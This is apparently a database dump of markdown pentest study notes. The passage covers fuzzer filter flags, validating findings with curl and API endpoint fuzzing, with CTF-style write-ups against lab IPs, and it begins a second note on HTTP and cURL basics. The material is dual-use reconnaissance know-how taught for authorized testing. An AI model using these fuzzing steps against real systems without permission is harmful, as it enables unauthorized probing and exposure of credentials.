FFUF has the most flexible filtering system, split into **match** flags (include) and **filter** flags (exclude). Match flags start with `-m` and filter flags start with `-f`, each applying to code (`c`), size (`s`), words (`w`), lines (`l`), or time (`t`). By default ffuf matches a sensible set of codes (`200-299,301,302,307,401,403,405,500`) to hide `404` noise automatically. You can combine several filters to narrow results precisely.

| Flag | Description |
|------|-------------|
| `-mc` (match code) | Show only these status codes (default set covers common useful ones). |
| `-fc` (filter code) | Hide these status codes (e.g. `-fc 404`). |
| `-fs` (filter size) | Hide responses of a given size/range. |
| `-ms` (match size) | Show only responses of a given size/range. |
| `-fw` (filter words) | Hide responses with a given word count. |
| `-mw` (match words) | Show only responses with a given word count. |
| `-fl` (filter lines) | Hide responses with a given line count. |
| `-ml` (match lines) | Show only responses with a given line count. |
| `-mt` (match time) | Show only responses meeting a time-to-first-byte condition. |

**Combined examples:**

```bash
# Match code 200, filter by words, size > 500 bytes
$ ffuf -u http://example.com/FUZZ -w wordlist.txt -mc 200 -fw 427 -ms >500

# Filter out 404, 401, 302
$ ffuf -u http://example.com/FUZZ -w wordlist.txt -fc 404,401,302

# Find .bak backups between 10KB and 100KB
$ ffuf -u http://example.com/FUZZ.bak -w wordlist.txt -fs 0-10239 -ms 10240-102400

# Find slow endpoints (TTFB > 500ms)
$ ffuf -u http://example.com/FUZZ -w wordlist.txt -mt >500
```

---

## 7.4 wenum Filters

wenum uses `--h*` flags to **hide** and `--s*` flags to **show**, applied to code, length (lines), word count, size (bytes), and regex. This mirrors ffuf''s include/exclude idea with different names. The regex filters (`--hr` / `--sr`) are especially handy for showing or hiding responses whose body contains specific text, like an error message or the word "admin".

| Flag | Description |
|------|-------------|
| `--hc` / `--sc` | Hide / show these status codes. |
| `--hl` / `--sl` | Hide / show by content length (lines). |
| `--hw` / `--sw` | Hide / show by word count. |
| `--hs` / `--ss` | Hide / show by response size. |
| `--hr` / `--sr` | Hide / show by body regex match. |
| `--filter` / `--hard-filter` | General regex filter; hard-filter also blocks post-processing. |

**Combined examples:**

```bash
# Show only success + redirects
$ wenum -w wordlist.txt --sc 200,301,302 -u https://example.com/FUZZ

# Hide common error codes
$ wenum -w wordlist.txt --hc 404,400,500 -u https://example.com/FUZZ

# Show short error messages (5-10 words)
$ wenum -w wordlist.txt --sw 5-10 -u https://example.com/FUZZ

# Filter for bodies containing admin or password
$ wenum -w wordlist.txt --sr "admin\|password" -u https://example.com/FUZZ
```

---

## 7.5 Feroxbuster Filters

Feroxbuster''s filters work on both requests and responses, using longer flag names. You can exclude by size (`-S`), regex (`-X`), word count (`-W`), line count (`-N`), status code (`-C`), or similarity to a reference page (`--filter-similar-to`). The `-s` flag acts as an allowlist of status codes to include, and `--dont-scan` skips URLs you know are uninteresting (like an images folder) even during recursion.

| Flag | Description |
|------|-------------|
| `--dont-scan` | Exclude specific URLs/patterns from scanning. |
| `-S, --filter-size` | Exclude responses by byte size. |
| `-X, --filter-regex` | Exclude responses matching a regex. |
| `-W, --filter-words` | Exclude responses by word count. |
| `-N, --filter-lines` | Exclude responses by line count. |
| `-C, --filter-status` | Exclude responses by status code (denylist). |
| `--filter-similar-to` | Exclude responses similar to a reference page. |
| `-s, --status-codes` | Include only these status codes (allowlist). |

**Combined example:**

```bash
# Status 200, exclude >10KB or bodies containing "error"
$ feroxbuster --url http://example.com -w wordlist.txt -s 200 -S 10240 -X "error"
```

---

## 7.6 Demonstration: Default vs No Filter

This shows why filtering is essential. By default, ffuf applies a sensible matcher (`200-299,301,302,307,401,403,405,500`), which quietly hides `404` noise so the good results stand out. If you override this with `-mc all`, ffuf matches **every** status code, and the output floods with `404 NOT FOUND` lines — making it much harder to spot anything useful. The lesson: default filtering is your friend, and you should tune filters rather than disable them.

**Default behavior (good):**

```bash
$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v
# :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
```

**Matching everything (noisy):**

```bash
$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v -mc all
# Floods with 404s:
# [Status: 404] FUZZ: .cache
# [Status: 404] FUZZ: .bash_history
# ...
```

The `-mc all` run buries real findings under endless `404`s, proving the value of good filtering.

---

### Documentation Example (CTF-style write-up)

> **Technique note:** Filtering tuned to isolate the one valid response.
>
> **Reproduction:**
> ```bash
> # Baseline noise length measured, then filtered out
> $ ffuf -u http://10.129.42.190/FUZZ -w .../common.txt -fs 0 -mc 200,301
> ```
>
> **Evidence / Notes:** Error pages were a uniform size; filtering by size (`-fs`) plus status (`-mc 200,301`) reduced output from thousands of lines to the handful of real hits. Demonstrates responsible, readable fuzzing output.
>
> **Screenshot placeholder:** `[ Attach before/after filtered output ]`

---

# 8. Validating Findings

---

## 8.1 Why Validate

Fuzzing is great at casting a wide net, but not every hit is a real vulnerability — many are **false positives**, harmless anomalies that merely tripped the fuzzer''s detection. Validation is therefore a crucial step that separates genuine issues from noise. Validating serves several purposes: it **confirms** the issue is real, helps you **understand the impact** and severity, lets you **reproduce** it reliably for a fix, and lets you **gather evidence** to show developers or stakeholders. Skipping validation leads to inaccurate reports and wasted effort, so always confirm before you claim a finding.

Why validate:

- **Confirming vulnerabilities:** ensure it is real, not a false alarm.
- **Understanding impact:** assess severity and effect on the app.
- **Reproducing the issue:** replicate it consistently for fixes.
- **Gathering evidence:** collect proof for stakeholders.

---

## 8.2 Manual Verification

The most reliable way to validate is **manual verification**: repeating the suspicious request by hand and carefully reading the result. This usually has three parts. First, **reproduce the request** with curl or a browser to recreate the unusual response. Second, **analyze the response** for error messages, unexpected content, or behavior that deviates from the norm. Third, if it looks promising, attempt a **safe, controlled exploitation** to measure impact — but only with proper authorization. The guiding principle is to prove the issue **without causing harm**: build a harmless proof of concept (for example, a SQL query that just returns the database version) rather than extracting or damaging real data.

The three steps:

1. **Reproduce the request** — resend the exact triggering request with curl or a browser.
2. **Analyze the response** — look for errors, unexpected content, or abnormal behavior.
3. **Exploitation (safe PoC)** — demonstrate impact without harming the system, only when authorized.

---

## 8.3 Using curl for Validation

Imagine your fuzzer found a `/backup/` directory returning `200 OK`. Backup directories often hold sensitive data — database dumps, config files, source code — so this deserves careful, responsible validation. First, use curl to check whether the directory is **browsable** (lists its contents). If it is, you have confirmed a directory listing issue. But to avoid exposing sensitive data unnecessarily, the responsible approach is to examine **response headers** rather than downloading file contents. The `Content-Type` header hints at a file''s type, and `Content-Length` tells you if a file actually has content (a non-zero length on a file like `password.txt` is a strong signal).

**Step 1 — Check if the directory is browsable:**

```bash
$ curl http://IP:PORT/backup/
```

If the server returns an HTML directory listing (an "Index of /backup/" page listing files like `backup.sql`), the directory listing issue is confirmed.

**Step 2 — Inspect a file''s headers responsibly with `-I`** (headers only, no body):

```bash
$ curl -I http://IP:PORT/backup/password.txt

HTTP/1.1 200 OK
Content-Type: text/plain;charset=utf-8
Content-Length: 171
Server: lighttpd/1.4.76
```

**Interpreting the headers:**

- `Content-Type: text/plain` — confirms `password.txt` is a plain text file, as expected.
- `Content-Length: 171` — the file is 171 bytes, so it is **not empty** and likely holds real data. Combined with the filename and location, this is strong evidence of a sensitive file.

By focusing on headers, you prove the risk exists without directly reading the sensitive contents — a responsible balance between confirming the vulnerability and avoiding unnecessary exposure.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Exposed `/backup/` directory with directory listing and a sensitive file.
>
> **Reproduction:**
> ```bash
> $ curl http://10.129.42.190/backup/        # -> "Index of /backup/" listing (backup.sql, password.txt)
> $ curl -I http://10.129.42.190/backup/password.txt
> HTTP/1.1 200 OK
> Content-Type: text/plain;charset=utf-8
> Content-Length: 171
> ```
>
> **Evidence / Notes:** Directory listing enabled on `/backup/`; `password.txt` is present and non-empty (171 bytes). Validated via headers only (no content retrieved) to respect data sensitivity. Severity: High — likely credential exposure. Recommend disabling directory listing and removing backups from web root.
>
> **Screenshot placeholder:** `[ Attach directory index + curl -I headers ]`

---

# 9. Web APIs

---

## 9.1 What a Web API Is

A **Web API (Application Programming Interface)** is a set of rules that lets different software applications talk to each other over the web, regardless of the languages or technologies they are built with. It acts as a **bridge** between a server (which holds data and functionality) and a client (a browser, mobile app, or another server) that wants to use that data. Instead of a human reading a web page, an API delivers structured data for another program to process. Understanding APIs matters for fuzzing because you target them differently from normal web pages — you focus on endpoints, parameters, and data formats rather than HTML files.

---

## 9.2 REST, SOAP, and GraphQL

There are several types of Web APIs, each with its own style, strengths, and query format. **REST** is the most popular — it is stateless, uses standard HTTP methods (GET/POST/PUT/DELETE) for CRUD operations on resources identified by URLs, and usually exchanges JSON or XML. **SOAP** is more formal and standardized, using XML messages wrapped in "envelopes" with built-in security and reliability features, making it suited to strict enterprise applications. **GraphQL** is newer: it exposes a single endpoint where the client asks for exactly the data it needs, solving the over-fetching and under-fetching problems common in REST.

**REST example:**

```http
GET /users/123
```

**SOAP example:**

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetStockPrice>
         <tem:StockName>AAPL</tem:StockName>
      </tem:GetStockPrice>
   </soapenv:Body>
</soapenv:Envelope>
```

**GraphQL example:**

```graphql
query {
  user(id: 123) {
    name
    email
  }
}
```

---

## 9.3 API vs Web Server

It helps to clearly separate an API from a traditional web server, because they are built and used differently, and fuzzing each requires a different mindset. A **web server** mainly serves content for humans — HTML, CSS, images — to be viewed in a browser. An **API** mainly provides a way for software to exchange data and trigger actions, often in JSON or XML, and users rarely interact with it directly (an app uses it behind the scenes). For fuzzing, this means you stop hunting for hidden HTML files and instead focus on API **endpoints**, their **parameters**, and the **data formats** used in requests and responses.

| Feature | Web Server | API |
|---------|-----------|-----|
| Purpose | Serve static/dynamic web pages. | Let applications exchange data and trigger actions. |
| Communication | HTTP with browsers. | HTTP(S), SOAP, and others depending on the API. |
| Data Format | HTML, CSS, JavaScript. | JSON, XML, and others. |
| User Interaction | Users view pages directly in a browser. | Apps use the API on the user''s behalf. |
| Access | Usually publicly accessible. | Public, private (internal), or partner-only. |

---

### Documentation Example (CTF-style write-up)

> **Recon note:** Target exposes a REST API, not a static site.
>
> ```bash
> $ curl -s -i http://10.129.42.190/api/users/123
> HTTP/1.1 200 OK
> Content-Type: application/json
> {"id":123,"name":"..."}
> ```
>
> **Evidence / Notes:** JSON `Content-Type` and resource-style path (`/api/users/{id}`) confirm a REST API. Fuzzing approach switched from file/dir discovery to endpoint + parameter fuzzing accordingly.
>
> **Screenshot placeholder:** `[ Attach JSON API response ]`

---

# 10. Identifying Endpoints

---

## 10.1 REST Endpoints and Parameters

Before you can fuzz an API you must find its **endpoints** — the unique URLs that represent resources. REST endpoints follow a clear, hierarchical pattern: `/users` is a collection, `/users/123` is a specific user, `/products/456` is a specific product. They also take **parameters** in three forms: **query parameters** (after a `?`, for filtering/sorting/pagination), **path parameters** (embedded in the URL to identify a resource), and **request body parameters** (sent in POST/PUT/PATCH bodies to create or update data). You discover these through documentation, traffic analysis, or fuzzing.

**Parameter types:**

| Type | Description | Example |
|------|-------------|---------|
| Query Parameters | After `?`; filter/sort/paginate. | `/users?limit=10&sort=name` |
| Path Parameters | Embedded in the URL; identify a resource. | `/products/{id}` |
| Request Body Parameters | In POST/PUT/PATCH bodies; create/update. | `{ "name": "New Product", "price": 99.99 }` |

**Three discovery methods:**

- **API Documentation:** the most reliable source; look for Swagger (OpenAPI) or RAML specs.
- **Network Traffic Analysis:** intercept real requests with Burp Suite or DevTools.
- **Parameter Name Fuzzing:** use ffuf/wfuzz with wordlists to find undocumented parameters.

---

## 10.2 SOAP Endpoints and Parameters

SOAP APIs are structured very differently from REST. Instead of many URLs, a SOAP API usually exposes a **single endpoint**, and the specific operation you want is determined by the **content of the XML message** you send, not the URL. The parameters live inside the body of that XML message, organized into elements and attributes. The master reference for a SOAP API is its **WSDL file**, an XML document that describes every operation, its input and output parameters, their data types, and the endpoint location. Reading the WSDL is the fastest way to understand a SOAP service.

**Sample SOAP request** (operation `SearchBooks` with parameters):

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lib="http://example.com/library">
   <soapenv:Header/>
   <soapenv:Body>
      <lib:SearchBooks>
         <lib:keywords>cybersecurity</lib:keywords>
         <lib:author>Dan Kaminsky</lib:author>
      </lib:SearchBooks>
   </soapenv:Body>
</soapenv:Envelope>
```

**Three discovery methods:**

- **WSDL Analysis:** the WSDL lists operations, input/output parameters, data types, and the endpoint URL.
- **Network Traffic Analysis:** capture SOAP traffic with Wireshark or tcpdump to study message structure.
- **Fuzzing for Parameter Names and Values:** send malformed/unexpected values to find hidden operations or parameters.

---

## 10.3 GraphQL Endpoints, Queries, and Mutations

GraphQL is designed for flexibility and typically exposes a **single endpoint** (often `/graphql`) that handles everything. Clients use a special query language to ask for exactly the data they want. **Queries** fetch data — they pinpoint specific fields, relationships, and nested objects, and can take arguments for filtering or pagination. **Mutations** change data — they create, update, or delete, and also accept arguments for the input values. Because GraphQL supports **introspection**, you can often ask the endpoint itself for its full schema, which is a powerful discovery shortcut.

**Query example** (fetch a user plus their posts):

```graphql
query {
  user(id: 123) {
    name
    email
    posts(limit: 5) {
      title
      body
    }
  }
}
```

**Mutation example** (create a post):

```graphql
mutation {
  createPost(title: "New Post", body: "This is the content of the new post") {
    id
    title
  }
}
```

**Three discovery methods:**

- **Introspection:** send an introspection query to retrieve the full schema (types, fields, queries, mutations, arguments).
- **API Documentation:** tools like GraphiQL or GraphQL Playground let you explore the schema interactively.
- **Network Traffic Analysis:** capture real requests to the `/graphql` endpoint to learn valid query/mutation formats.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Swagger/OpenAPI docs expose full REST endpoint map.
>
> **Reproduction:**
> ```bash
> $ curl -s http://10.129.42.190/docs        # Swagger UI
> $ curl -s http://10.129.42.190/openapi.json | jq ''.paths | keys''
> ```
>
> **Evidence / Notes:** Documented endpoints enumerated from the OpenAPI spec (e.g. `/items/{id}` with GET/PUT/DELETE/POST). This map drives targeted parameter and method fuzzing in the next phase.
>
> **Screenshot placeholder:** `[ Attach Swagger UI / paths list ]`

---

# 11. API Fuzzing

---

## 11.1 What API Fuzzing Is

API fuzzing is a specialized form of fuzzing tailored to web APIs. The core idea is the same as any fuzzing — send unexpected or invalid inputs and watch for problems — but it focuses on the unique structure and protocols APIs use. In practice you bombard API endpoints with many automated tests, each a slightly modified request. Those modifications might include **altering parameter values, modifying request headers, changing the order of parameters, or introducing unexpected data types or formats**. The goal is to trigger errors, crashes, or unexpected behavior that reveal vulnerabilities like input validation flaws, injection attacks, or authentication issues.

Typical modifications sent during API fuzzing:

- Altering parameter values.
- Modifying request headers.
- Changing the order of parameters.
- Introducing unexpected data types or formats.

---

## 11.2 Why Fuzz APIs

Fuzzing APIs is crucial for several reasons that mirror general fuzzing but with an API twist. It **uncovers hidden vulnerabilities** by finding undocumented endpoints and parameters that are often weakly protected. It **tests robustness**, checking that the API handles malformed input gracefully instead of crashing or leaking data. It **automates security testing**, since manually trying every input combination is impossible. And it **simulates real-world attacks**, letting you find weaknesses before attackers do. Because APIs frequently expose powerful backend functionality, these benefits make API fuzzing especially valuable.

Reasons to fuzz APIs:

- **Uncovering hidden vulnerabilities:** finds undocumented endpoints/parameters.
- **Testing robustness:** ensures graceful handling of bad input.
- **Automating security testing:** covers inputs manual testing cannot.
- **Simulating real-world attacks:** finds issues before attackers.

---

## 11.3 Types of API Fuzzing

There are three primary types of API fuzzing, each targeting a different aspect of how an API works. **Parameter fuzzing** systematically tests different values for query parameters, headers, and request bodies to expose injection (SQLi, command injection), XSS, and parameter tampering. **Data format fuzzing** manipulates the structure, content, or encoding of JSON/XML payloads to reveal parsing errors, buffer overflows, or mishandling of special characters. **Sequence fuzzing** changes the order and timing of multiple interconnected requests to uncover race conditions, IDOR, or authorization bypasses. Together they cover values, formats, and logic.

1. **Parameter Fuzzing** — tests values in query params, headers, and bodies; exposes injection, XSS, tampering.
2. **Data Format Fuzzing** — manipulates JSON/XML structure, content, or encoding; exposes parsing/overflow/special-char issues.
3. **Sequence Fuzzing** — alters order/timing of request chains; exposes race conditions, IDOR, authorization bypasses.

---

## 11.4 Exploring and Fuzzing the API

To fuzz an API you first explore its documented endpoints (often via a `/docs` Swagger page), then hunt for **hidden/undocumented** endpoints that were intentionally left out of the docs — these may serve internal functions, be "security through obscurity," or still be under development. You use a fuzzer with a wordlist to discover them, watching for valid responses (`200`) and unusual codes (like `405 Method Not Allowed`, which means the endpoint exists but you used the wrong method). Then you explore the discovered endpoints with curl.

**Step 1 — Clone and set up the API fuzzer:**

```bash
$ git clone https://github.com/PandaSt0rm/webfuzz_api.git
$ cd webfuzz_api
$ pip3 install -r requirements.txt
```

**Step 2 — Run the fuzzer against the target:**

```bash
$ python3 api_fuzzer.py http://IP:PORT
```

**Reading the results:**

- Most endpoints return `404 Not Found` (invalid).
- Valid endpoints are reported, e.g. an undocumented `/cz...` and the documented `/docs`.
- A `405 Method Not Allowed` on `/items` means the endpoint exists but needs a different HTTP method (e.g. POST instead of GET).

**Step 3 — Explore the undocumented endpoint with curl:**

```bash
$ curl http://localhost:8000/cz...
{"flag":"<snip>"}
```

The hidden endpoint returns the flag, proving it existed despite being absent from the docs.

**Beyond endpoints — fuzzing parameters** can expose deeper issues:

- **Broken Object-Level Authorization (BOLA/IDOR):** manipulating parameter values grants access to objects you should not see.
- **Broken Function-Level Authorization:** manipulating parameters lets you call functions you are not authorized for.
- **Server-Side Request Forgery (SSRF):** injecting malicious values tricks the server into making unintended internal/external requests.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Undocumented API endpoint discovered via fuzzing.
>
> **Reproduction:**
> ```bash
> $ git clone https://github.com/PandaSt0rm/webfuzz_api.git && cd webfuzz_api
> $ pip3 install -r requirements.txt
> $ python3 api_fuzzer.py http://10.129.42.190:8000
> # Found: /cz...  (undocumented), /docs (documented)
> # Unusual: 405 on /items (wrong method)
>
> $ curl http://10.129.42.190:8000/cz...
> {"flag":"<snip>"}
> ```
>
> **Evidence / Notes:** `/cz...` is not present in the Swagger docs yet returns valid data — a hidden endpoint (security-through-obscurity failure). `405` on `/items` indicates method-restricted functionality worth testing with POST/PUT. Next step: parameter fuzzing for BOLA/IDOR and SSRF.
>
> **Screenshot placeholder:** `[ Attach fuzzer output + /cz... flag response ]`

---

## Wrapping Up

You now have an end-to-end methodology for web fuzzing: the difference between fuzzing and brute-forcing, the four main tools (ffuf, Gobuster, FeroxBuster, wenum), and how to apply them across directory/file discovery, recursive fuzzing, parameter and value fuzzing, and virtual host and subdomain enumeration. You also know how to tame the output with filtering, how to responsibly validate findings so you report real issues instead of false positives, and how to pivot from traditional web fuzzing into Web API recon and API fuzzing (REST, SOAP, GraphQL). The winning habit is always the same: fuzz broadly, filter aggressively, validate manually, and document every confirmed finding with clean reproduction steps and evidence — exactly as shown in the examples throughout these notes.', NULL, 'PUBLISHED', 'PUBLIC', 45, 'cmvfonfhr00ayida0a37aijsy', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792441007.291), to_timestamp(1792441007.291), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvfp5tk500esida0h2rs5ijy', 'Web Requests', 'web-requests', '---', '# Web Requests — Complete Notes

---

## Table of Contents

1. [HyperText Transfer Protocol (HTTP)](#1-hypertext-transfer-protocol-http)
   - 1.1 [What HTTP Is](#11-what-http-is)
   - 1.2 [URL Structure](#12-url-structure)
   - 1.3 [HTTP Flow](#13-http-flow)
   - 1.4 [cURL Basics](#14-curl-basics)
2. [HyperText Transfer Protocol Secure (HTTPS)](#2-hypertext-transfer-protocol-secure-https)
   - 2.1 [Why HTTPS Exists](#21-why-https-exists)
   - 2.2 [HTTPS Overview (Clear-text vs Encrypted)](#22-https-overview-clear-text-vs-encrypted)
   - 2.3 [HTTPS Flow](#23-https-flow)
   - 2.4 [cURL for HTTPS](#24-curl-for-https)
3. [HTTP Requests and Responses](#3-http-requests-and-responses)
   - 3.1 [The Request / Response Model](#31-the-request--response-model)
   - 3.2 [HTTP Request Structure](#32-http-request-structure)
   - 3.3 [HTTP Response Structure](#33-http-response-structure)
   - 3.4 [cURL Verbose Mode](#34-curl-verbose-mode)
   - 3.5 [Browser DevTools](#35-browser-devtools)
4. [HTTP Headers](#4-http-headers)
   - 4.1 [What Headers Are](#41-what-headers-are)
   - 4.2 [General Headers](#42-general-headers)
   - 4.3 [Entity Headers](#43-entity-headers)
   - 4.4 [Request Headers](#44-request-headers)
   - 4.5 [Response Headers](#45-response-headers)
   - 4.6 [Security Headers](#46-security-headers)
   - 4.7 [cURL with Headers](#47-curl-with-headers)
   - 4.8 [Viewing Headers in DevTools](#48-viewing-headers-in-devtools)
5. [HTTP Methods and Status Codes](#5-http-methods-and-status-codes)
   - 5.1 [Request Methods](#51-request-methods)
   - 5.2 [Status Codes](#52-status-codes)
6. [GET Requests](#6-get-requests)
   - 6.1 [How GET Works](#61-how-get-works)
   - 6.2 [HTTP Basic Auth](#62-http-basic-auth)
   - 6.3 [HTTP Authorization Header](#63-http-authorization-header)
   - 6.4 [GET Parameters](#64-get-parameters)
7. [POST Requests](#7-post-requests)
   - 7.1 [Why POST Is Used](#71-why-post-is-used)
   - 7.2 [Login Forms](#72-login-forms)
   - 7.3 [Authenticated Cookies](#73-authenticated-cookies)
   - 7.4 [JSON Data](#74-json-data)
8. [CRUD API](#8-crud-api)
   - 8.1 [What APIs Are](#81-what-apis-are)
   - 8.2 [CRUD Operations](#82-crud-operations)
   - 8.3 [Read (GET)](#83-read-get)
   - 8.4 [Create (POST)](#84-create-post)
   - 8.5 [Update (PUT)](#85-update-put)
   - 8.6 [Delete (DELETE)](#86-delete-delete)

---

# 1. HyperText Transfer Protocol (HTTP)

---

## 1.1 What HTTP Is

HTTP is the language that web browsers and web servers use to talk to each other. Almost everything you do on the internet — opening a website, logging in, submitting a form — happens through HTTP requests behind the scenes. HTTP is an application-level protocol, which means it sits at the top layer and is used to access resources on the World Wide Web. The word *hypertext* just means text that contains links to other resources. Communication always has two sides: a **client** (your browser or a tool like cURL) that asks for something, and a **server** (the web server) that answers. The default port for HTTP is **port 80**, but it can be changed to any port depending on how the server is configured.

When you want to visit a site, you type a Fully Qualified Domain Name (FQDN) like `www.hackthebox.com` as a URL, and the browser turns that into an HTTP request to fetch the page.

---

## 1.2 URL Structure

A URL (Uniform Resource Locator) is more than just a website name — it is a structured address that tells the client exactly what to fetch and how. Each URL can be broken into several parts, and most of them are optional. Understanding each piece matters in penetration testing because you often need to manually craft or modify URLs to reach hidden resources, pass credentials, or inject parameters. The only truly required parts are the **scheme** and the **host**, because without them the request has no protocol and no target. Everything else fine-tunes the request.

Here is a full example URL that uses every component:

```
http://admin:password@inlanefreight.com:80/dashboard.php?login=true#status
```

**Breakdown of each component:**

| Component | Example | Description |
|-----------|---------|-------------|
| Scheme | `http://` `https://` | Identifies the protocol being used. Ends with a colon and two slashes (`://`). |
| User Info | `admin:password@` | Optional credentials (username and password separated by `:`) used to authenticate to the host. Separated from the host by an `@` sign. |
| Host | `inlanefreight.com` | The location of the resource. Can be a hostname (domain) or an IP address. |
| Port | `:80` | Separated from the host by `:`. If not given, `http` defaults to **80** and `https` defaults to **443**. |
| Path | `/dashboard.php` | Points to the exact file or folder being requested. If left out, the server returns a default index (e.g. `index.html`). |
| Query String | `?login=true` | Starts with `?`, holds a parameter (`login`) and a value (`true`). Multiple parameters are joined with `&`. |
| Fragment | `#status` | Processed only by the browser on the client side to jump to a section of the page (like a heading). |

---

## 1.3 HTTP Flow

The HTTP flow describes the step-by-step journey a request takes from the moment you type a URL to the moment the page appears. First, the browser needs the server''s IP address, because computers communicate using IP addresses, not names. So the browser sends the domain name to a **DNS (Domain Name System)** server, which looks up the matching IP and returns it. Only after the IP is known can the actual HTTP request be sent. This resolution step happens for every domain name you visit, and it is the invisible first stage of nearly every web interaction.

**Step-by-step of what happens when you visit `inlanefreight.com`:**

1. You type `inlanefreight.com` into the browser.
2. The browser sends a **DNS query** asking "what is the IP for this domain?".
3. The DNS server replies with the IP (for example `152.153.81.14`).
4. The browser sends a **GET request** to port 80, asking for the root path `/`.
5. The web server receives the request and, by default, returns its index file.
6. The server reads `index.html` and sends it back as an **HTTP response** with a status code like `200 OK`.
7. The browser renders the HTML and shows you the page.

**Note:** Browsers first check the local `/etc/hosts` file before contacting a DNS server. If the domain is listed there, that entry is used. You can manually add a record by writing the IP followed by the domain name into `/etc/hosts`, which is very useful in CTFs when a box uses a custom hostname.

```bash
# Add a custom host record manually (needed for many HTB/THM boxes)
$ sudo sh -c ''echo "10.129.42.190  inlanefreight.htb" >> /etc/hosts''
```

---

## 1.4 cURL Basics

cURL (client URL) is a command-line tool that sends web requests, and it is one of the most important tools for any web penetration tester. Unlike a browser, cURL does not render HTML, CSS, or JavaScript — it prints the raw response exactly as the server sends it. This is actually an advantage for testing, because penetration testers care about the request and response details, not how a page looks. cURL also supports many protocols beyond HTTP, which makes it perfect for scripting and automation. For practice, the examples use `http://info.cern.ch/`, which is famously the very first website ever created, built in 1990 by Tim Berners-Lee at CERN.

**Step 1 — Send a basic request to a URL:**

```bash
$ curl http://info.cern.ch/

<html><head></head><body><header>
<title>http://info.cern.ch</title>
</header>
<h1>http://info.cern.ch - home of the first website</h1>
...SNIP...
```

The raw HTML is printed straight to the terminal instead of being rendered.

**Step 2 — Download a page or file and save it.** Use `-O` to save with the original remote filename, or `-o` to choose your own filename:

```bash
# Save using the remote file''s name (index.html)
$ curl -O http://info.cern.ch/index.html

# Save under a custom name
$ curl -o mypage.html http://info.cern.ch/index.html
```

**Step 3 — Silence the progress output** with `-s` (silent mode), so nothing extra is printed:

```bash
$ curl -s -O http://info.cern.ch/index.html
```

**Step 4 — View available options** with the help flag:

```bash
$ curl -h
```

Some of the most useful flags you will reuse constantly:

| Flag | Meaning |
|------|---------|
| `-d, --data` | Send HTTP POST data |
| `-i, --include` | Include response headers in the output |
| `-o, --output <file>` | Write output to a named file |
| `-O, --remote-name` | Write output to a file named like the remote file |
| `-s, --silent` | Silent mode (no progress bar) |
| `-u, --user <user:password>` | Provide a username and password |
| `-A, --user-agent <name>` | Set a custom User-Agent |
| `-v, --verbose` | Show full request and response details |

For the full manual, use `--help all` or read the manual page with `man curl`.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Target web server reachable and serving content over HTTP.
>
> **Reproduction:**
> ```bash
> $ curl -s -i http://10.129.42.190/
> HTTP/1.1 200 OK
> Server: Apache/2.4.41 (Ubuntu)
> Content-Type: text/html; charset=UTF-8
> ...
> ```
>
> **Evidence / Notes:** Server responds with `200 OK` on the root path `/`, confirming a live web service on port 80. Server banner discloses `Apache/2.4.41 (Ubuntu)`, useful for later version-based enumeration. Custom hostname added to `/etc/hosts` as `inlanefreight.htb` to allow name-based access.
>
> **Screenshot placeholder:** `[ Attach terminal screenshot of the curl 200 OK response here ]`

---

# 2. HyperText Transfer Protocol Secure (HTTPS)

---

## 2.1 Why HTTPS Exists

Plain HTTP has a serious weakness: every piece of data travels in **clear-text**, meaning anyone sitting between you and the server can read it. This opens the door to a **Man-in-the-Middle (MITM)** attack, where an attacker on the same network silently captures everything you send, including passwords. To fix this, **HTTPS (HTTP Secure)** was created, which wraps all communication in encryption. Even if an attacker intercepts the traffic, they only see scrambled data they cannot read. Because of this protection, HTTPS has become the standard for websites, and plain HTTP is being phased out — soon most browsers will warn against or block HTTP-only sites entirely.

---

## 2.2 HTTPS Overview (Clear-text vs Encrypted)

The difference between HTTP and HTTPS becomes obvious when you capture the traffic. In a plain HTTP login request, the username and password appear in **plain readable text** inside the captured packet. Anyone on a shared network — like public Wi-Fi — could grab that request and reuse the stolen credentials. With HTTPS, the same login is captured as a single **encrypted stream** (shown as TLS application data in a tool like Wireshark), so the credentials and any other sensitive data are unreadable. You can tell a site uses HTTPS by the `https://` scheme in the URL and the padlock icon to the left of the address bar.

**Important note on DNS leakage:** Even though HTTPS encrypts the *data*, the website you visit can still leak through a clear-text DNS lookup. To stay fully private, use an encrypted DNS server (like `8.8.8.8` or `1.1.1.1`) or route traffic through a VPN so even the DNS queries are hidden.

---

## 2.3 HTTPS Flow

The HTTPS flow adds a secure handshake on top of the normal HTTP flow. If you type `http://` for a site that enforces HTTPS, the server does not just serve the page — it redirects you to the secure version first. This redirect usually comes back as a `301 Moved Permanently` response, sending you from port 80 (HTTP) to port 443 (HTTPS). After that, the client and server perform a TLS handshake to agree on encryption keys before any real data moves. This handshake is what makes everything afterward private.

**Step-by-step of the HTTPS handshake:**

1. The browser tries to reach the site, first contacting port **80** (unencrypted HTTP).
2. The server detects this and sends a **301 redirect** to the secure HTTPS port **443**.
3. The client sends a **"client hello"** packet describing itself.
4. The server replies with a **"server hello"**, then a key exchange sharing its SSL certificate.
5. The client verifies that certificate and sends one of its own.
6. An **encrypted handshake** confirms both sides can encrypt and decrypt correctly.
7. Normal HTTP communication continues from here on, but now fully encrypted.

